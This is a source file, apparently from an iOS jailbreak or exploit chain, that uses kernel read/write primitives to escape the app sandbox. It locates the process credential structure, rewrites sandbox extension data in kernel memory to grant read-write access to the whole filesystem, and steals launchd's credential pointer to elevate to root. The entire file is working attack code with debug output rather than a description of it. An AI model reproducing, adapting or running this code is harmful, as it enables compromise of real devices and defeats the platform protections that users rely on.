/*
 * sandbox_escape.m — Sandbox escape via kernel memory patching
 *
 * iOS 26.3 compat version with:
 * - Extended scan range (0x10-0x60)
 * - proc_ro memory dump for debugging
 * - Multiple ucred validation heuristics
 * - Relaxed validation fallback
 */

#import <Foundation/Foundation.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/stat.h>
#include "sandbox_escape.h"
#include "kexploit/kexploit_opa334.h"
#include "kexploit/krw.h"
#include "kexploit/kutils.h"
#include "kexploit/offsets.h"

extern void early_kread(uint64_t where, void *read_buf, size_t size);

#define KRW_LEN 0x20

// Offsets — these may differ in 26.3, so scan is used
#define OFF_PROC_PROC_RO       0x18
#define OFF_UCRED_CR_LABEL     0x78
#define OFF_LABEL_SANDBOX      0x10
#define OFF_SANDBOX_EXT_SET    0x10
#define OFF_EXT_DATA           0x40
#define OFF_EXT_DATALEN        0x48

#ifdef __arm64e__
static uint64_t __attribute((naked)) __xpaci_sbx(uint64_t a) {
    asm(".long 0xDAC143E0");
    asm("ret");
}
#else
#define __xpaci_sbx(x) (x)
#endif

extern uint64_t VM_MIN_KERNEL_ADDRESS;
extern uint64_t pac_mask;

#define S(x) ({ uint64_t _v = __xpaci_sbx(x); \
    ((_v >> 32) > 0xFFFF ? (_v | pac_mask) : _v); })
#define K(x) ((x) > VM_MIN_KERNEL_ADDRESS)

// ==================== DEBUG: proc_ro memory dump ====================

static void dump_proc_ro(uint64_t proc_ro) {
    if (!K(proc_ro)) { printf("[DUMP] proc_ro invalid: 0x%llx\n", proc_ro); return; }

    printf("\n[DUMP] ========= proc_ro structure (0x00-0x70) =========\n");
    printf("[DUMP] offset  raw               smr               pac               note\n");
    printf("[DUMP] -------------------------------------------------------------------\n");
    for (uint32_t off = 0x00; off <= 0x70; off += 0x8) {
        uint64_t raw = early_kread64(proc_ro + off);
        uint64_t smr = kread_smrptr(proc_ro + off);
        uint64_t pac = S(raw);

        const char *note = "";
        uint64_t kernel_cand = K(pac) ? pac : (K(smr) ? smr : 0);

        if (K(kernel_cand)) {
            // Check if +0x78 points to kernel (cr_label signature)
            uint64_t at78 = S(early_kread64(kernel_cand + 0x78));
            if (K(at78)) {
                note = "← UCRED_CANDIDATE (cr_label+0x78 ok)";
            } else {
                // Check if +0x60 points to kernel (possible ucred with shifted cr_label)
                uint64_t at60 = S(early_kread64(kernel_cand + 0x60));
                if (K(at60)) {
                    note = "← UCRED_CANDIDATE (alt+0x60 ok)";
                } else {
                    note = "← KERNEL_PTR";
                }
            }
        }

        printf("[DUMP] 0x%02x    %016llx  %016llx  %016llx  %s\n",
               off, raw, smr, pac, note);
    }
    printf("[DUMP] =================================================================\n\n");
}

// ==================== UCRED VALIDATION (multiple heuristics) ====================

static bool validate_ucred_strict(uint64_t candidate) {
    // Original: cr_label at +0x78 → label → sandbox at +0x10
    if (!K(candidate)) return false;
    uint64_t lbl = S(early_kread64(candidate + OFF_UCRED_CR_LABEL));
    if (!K(lbl)) return false;
    uint64_t sbx = S(early_kread64(lbl + OFF_LABEL_SANDBOX));
    return K(sbx);
}

static bool validate_ucred_by_uid(uint64_t candidate) {
    // Check posix_cred area for valid uid/gid (0-65535)
    // posix_cred at ucred+0x18, uid at +0x00 within posix_cred
    if (!K(candidate)) return false;
    uint64_t uid_val = early_kread64(candidate + 0x18);
    uint32_t uid32 = (uint32_t)(uid_val & 0xFFFFFFFF);
    if (uid32 == 0 || uid32 > 65535) return false;

    uint64_t ruid_val = early_kread64(candidate + 0x1C);
    uint32_t ruid32 = (uint32_t)(ruid_val & 0xFFFFFFFF);
    if (ruid32 > 65535) return false;

    return true;
}

static bool validate_ucred_by_label_search(uint64_t candidate) {
    // Scan for cr_label at multiple possible offsets (0x60-0x90)
    if (!K(candidate)) return false;
    for (uint32_t lbl_off = 0x60; lbl_off <= 0x90; lbl_off += 0x8) {
        uint64_t lbl = S(early_kread64(candidate + lbl_off));
        if (!K(lbl)) continue;
        uint64_t sbx = S(early_kread64(lbl + 0x10));
        if (K(sbx)) return true;
        // Also try sandbox at other offsets
        for (uint32_t sbx_off = 0x8; sbx_off <= 0x20; sbx_off += 0x8) {
            uint64_t sbx2 = S(early_kread64(lbl + sbx_off));
            if (K(sbx2)) return true;
        }
    }
    return false;
}

static bool validate_ucred_relaxed(uint64_t candidate) {
    // Check all three methods
    return validate_ucred_strict(candidate) ||
           validate_ucred_by_uid(candidate) ||
           validate_ucred_by_label_search(candidate);
}

// ==================== SCANNING ====================

// Scan proc_ro for ucred at offsets [0x10, 0x60]
// Tries: strict → uid → label_search (for relaxed)
static int find_ucred_in_proc_ro(uint64_t proc_ro, uint64_t *ucred_out, uint32_t *off_out) {
    if (!K(proc_ro)) return -1;

    // First dump for debugging
    dump_proc_ro(proc_ro);

    // --- Phase 1: Strict validation, extended range ---
    for (uint32_t off = 0x10; off <= 0x60; off += 0x8) {
        uint64_t raw = early_kread64(proc_ro + off);
        uint64_t smr = kread_smrptr(proc_ro + off);
        uint64_t pac = S(raw);
        uint64_t cands[2] = { smr, pac };

        for (int i = 0; i < 2; i++) {
            uint64_t c = cands[i];
            if (!K(c)) continue;
            if (validate_ucred_strict(c)) {
                *ucred_out = c;
                *off_out = off;
                printf("[SBX] Found ucred at proc_ro+0x%x (SMR:%d) via STRICT = 0x%llx\n",
                       off, i, c);
                return 0;
            }
        }
    }

    // --- Phase 2: Relaxed validation, extended range ---
    printf("[SBX] Phase 1 strict scan failed, trying relaxed validation...\n");
    for (uint32_t off = 0x10; off <= 0x60; off += 0x8) {
        uint64_t raw = early_kread64(proc_ro + off);
        uint64_t smr = kread_smrptr(proc_ro + off);
        uint64_t pac = S(raw);
        uint64_t cands[2] = { smr, pac };

        for (int i = 0; i < 2; i++) {
            uint64_t c = cands[i];
            if (!K(c)) continue;
            if (validate_ucred_relaxed(c)) {
                *ucred_out = c;
                *off_out = off;
                printf("[SBX] Found ucred at proc_ro+0x%x (SMR:%d) via RELAXED = 0x%llx\n",
                       off, i, c);
                return 0;
            }
        }
    }

    // --- Phase 3: Last resort — find ANY candidate with kernel ptr at +0x78 ---
    printf("[SBX] Phase 2 relaxed scan failed, trying last-resort cr_label+0x78 check...\n");
    for (uint32_t off = 0x10; off <= 0x60; off += 0x8) {
        uint64_t raw = early_kread64(proc_ro + off);
        uint64_t pac = S(raw);
        if (!K(pac)) continue;

        // Try multiple possible cr_label offsets
        for (uint32_t lbl_off = 0x60; lbl_off <= 0x90; lbl_off += 0x8) {
            uint64_t lbl = S(early_kread64(pac + lbl_off));
            if (K(lbl)) {
                printf("[SBX] Candidate at proc_ro+0x%x: cr_label at offset 0x%x = 0x%llx\n",
                       off, lbl_off, lbl);
                // Accept first valid kernel pointer at +0x78-ish offset
                if (lbl_off == 0x78) {
                    *ucred_out = pac;
                    *off_out = off;
                    printf("[SBX] LAST-RESORT: ucred at proc_ro+0x%x = 0x%llx\n", off, pac);
                    return 0;
                }
            }
        }
    }

    printf("[SBX] FAILED: could not find ucred in proc_ro+0x10..0x60\n");
    return -1;
}

// ==================== EXTENSION PATCHING (unchanged logic) ====================

static void patch_ext(uint64_t ext) {
    uint64_t da = early_kread64(ext + OFF_EXT_DATA);
    uint64_t dl = early_kread64(ext + OFF_EXT_DATALEN);
    if (K(da) && dl > 0) {
        uint8_t buf[KRW_LEN];
        early_kread(da, buf, KRW_LEN);
        buf[0] = '/'; buf[1] = 0;
        early_kwrite32bytes(da, buf);
    }
    uint8_t chunk[KRW_LEN];
    early_kread(ext + OFF_EXT_DATA, chunk, KRW_LEN);
    *(uint64_t*)(chunk + 0x08) = 1;
    *(uint64_t*)(chunk + 0x10) = 0xFFFFFFFFFFFFFFFFULL;
    early_kwrite32bytes(ext + OFF_EXT_DATA, chunk);
}

static int patch_chain(uint64_t hdr) {
    int n = 0;
    for (int i = 0; i < 64 && K(hdr); i++) {
        uint64_t ext = S(early_kread64(hdr + 0x8));
        if (K(ext)) { patch_ext(ext); n++; }
        uint64_t next = early_kread64(hdr);
        if (!next || !K(next)) break;
        hdr = S(next);
    }
    return n;
}

static void set_rw_class(uint64_t hdr) {
    uint64_t ext = S(early_kread64(hdr + 0x8));
    if (!K(ext)) return;
    uint64_t da = early_kread64(ext + OFF_EXT_DATA);
    if (!K(da)) return;

    const char *rw = "com.apple.app-sandbox.read-write";
    uint8_t b1[KRW_LEN], b2[KRW_LEN];
    memset(b1, 0, KRW_LEN); memset(b2, 0, KRW_LEN);
    memcpy(b1, rw, KRW_LEN);
    early_kwrite32bytes(da + 32, b1);
    early_kwrite32bytes(da + 64, b2);

    uint8_t hb[KRW_LEN];
    early_kread(hdr, hb, KRW_LEN);
    *(uint64_t*)(hb + 0x10) = da + 32;
    early_kwrite32bytes(hdr, hb);
}

// ==================== MAIN SANDBOX ESCAPE ====================

int sandbox_escape(uint64_t self_proc) {
    if (!self_proc) { printf("[SBX] self_proc is NULL\n"); return -1; }

    uint64_t proc_ro_raw = early_kread64(self_proc + OFF_PROC_PROC_RO);
    uint64_t proc_ro = S(proc_ro_raw);
    printf("[SBX] self_proc=0x%llx proc_ro_raw=0x%llx proc_ro=0x%llx\n",
           self_proc, proc_ro_raw, proc_ro);
    if (!K(proc_ro)) { printf("[SBX] proc_ro invalid\n"); return -1; }

    // Dump the proc_ro memory for debugging - shows every 8-byte field
    dump_proc_ro(proc_ro);

    uint64_t ucred = 0;
    uint32_t ucred_off = 0;
    if (find_ucred_in_proc_ro(proc_ro, &ucred, &ucred_off) != 0) {
        printf("[SBX] ucred not found in proc_ro — offsets may be wrong for 26.3\n");
        return -1;
    }

    printf("[SBX] ucred=0x%llx at proc_ro+0x%x\n", ucred, ucred_off);

    // Try to find cr_label offset dynamically
    uint32_t cr_label_off = OFF_UCRED_CR_LABEL;
    uint64_t label = S(early_kread64(ucred + cr_label_off));
    if (!K(label)) {
        printf("[SBX] cr_label at 0x%x invalid, searching for correct offset...\n");
        for (uint32_t loff = 0x60; loff <= 0x90; loff += 0x8) {
            uint64_t lbl = S(early_kread64(ucred + loff));
            if (K(lbl)) {
                label = lbl;
                cr_label_off = loff;
                printf("[SBX] Found cr_label at offset 0x%x\n", loff);
                break;
            }
        }
    }
    if (!K(label)) { printf("[SBX] cr_label not found\n"); return -1; }

    // Try to find sandbox offset dynamically
    uint32_t sandbox_off = OFF_LABEL_SANDBOX;
    uint64_t sandbox = S(early_kread64(label + sandbox_off));
    if (!K(sandbox)) {
        for (uint32_t soff = 0x8; soff <= 0x20; soff += 0x8) {
            uint64_t sbx = S(early_kread64(label + soff));
            if (K(sbx)) {
                sandbox = sbx;
                sandbox_off = soff;
                printf("[SBX] Found sandbox at label+0x%x\n", soff);
                break;
            }
        }
    }
    if (!K(sandbox)) { printf("[SBX] sandbox invalid\n"); return -1; }

    uint64_t ext_set = S(early_kread64(sandbox + OFF_SANDBOX_EXT_SET));
    printf("[SBX] proc_ro=0x%llx ucred=0x%llx label=0x%llx sandbox=0x%llx ext_set=0x%llx\n",
           proc_ro, ucred, label, sandbox, ext_set);

    // --- Patch extensions ---
    int patched = 0;
    for (int s = 0; s < 16; s++) {
        uint64_t hdr = S(early_kread64(ext_set + s * 8));
        if (K(hdr)) patched += patch_chain(hdr);
    }
    printf("[SBX] Patched %d extensions\n", patched);

    int classed = 0;
    for (int s = 0; s < 16; s++) {
        uint64_t hdr = S(early_kread64(ext_set + s * 8));
        if (K(hdr) && K(early_kread64(hdr + 0x10))) { set_rw_class(hdr); classed++; }
    }
    printf("[SBX] Changed %d extension classes\n", classed);

    // Fill empty hash slots
    uint64_t src = 0;
    for (int s = 0; s < 16 && !src; s++) {
        uint64_t h = S(early_kread64(ext_set + s * 8));
        if (K(h)) src = h;
    }
    if (src) {
        int filled = 0;
        for (int s = 0; s < 16; s++) {
            uint64_t h = early_kread64(ext_set + s * 8);
            if (!h || !K(h)) { early_kwrite64(ext_set + s * 8, src); filled++; }
        }
        printf("[SBX] Filled %d empty hash slots\n", filled);
    }

    // Verify
    int fd_w = open("/var/mobile/.sbx_test", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd_w >= 0) { close(fd_w); unlink("/var/mobile/.sbx_test"); }

    if (fd_w >= 0) {
        printf("[SBX] *** SANDBOX ESCAPED (R+W) ***\n");
        return 0;
    }

    printf("[SBX] Sandbox escape verification failed (errno=%d: %s)\n", errno, strerror(errno));
    return -1;
}

// ==================== UID ELEVATION ====================

static int sbx_find_ucred_slot(uint64_t proc, uint64_t *ucred_out, uint32_t *off_out) {
    return find_ucred_in_proc_ro(S(early_kread64(proc + OFF_PROC_PROC_RO)), ucred_out, off_out);
}

int sandbox_elevate_to_root(uint64_t self_proc) {
    uint64_t launchd = proc_find_by_name("launchd");
    if (!launchd || launchd == (uint64_t)-1) {
        printf("[SBX] elevate: procbyname failed; trying pid 1\n");
        launchd = proc_find(1);
    }
    if (!launchd || launchd == (uint64_t)-1) {
        printf("[SBX] elevate: could not find launchd\n");
        return -1;
    }

    uint64_t launchducred = 0;
    uint32_t off = 0;
    if (sbx_find_ucred_slot(launchd, &launchducred, &off) != 0) {
        printf("[SBX] elevate: failed to get launchd ucred\n");
        return -1;
    }
    printf("[SBX] elevate: launchd ucred: 0x%llx\n", launchducred);

    uint64_t ourucredraw = early_kread64(self_proc + 0x10);
    uint64_t ourucred = S(ourucredraw);
    printf("[SBX] elevate: ourucred: 0x%llx\n", ourucred);

    early_kwrite64(self_proc + 0x10, launchducred);

    if (getuid() == 0) {
        printf("[SBX] *** ELEVATED TO ROOT ***\n");
        return 0;
    }

    printf("[SBX] elevate failed, uid: %d\n", getuid());
    return -1;
}
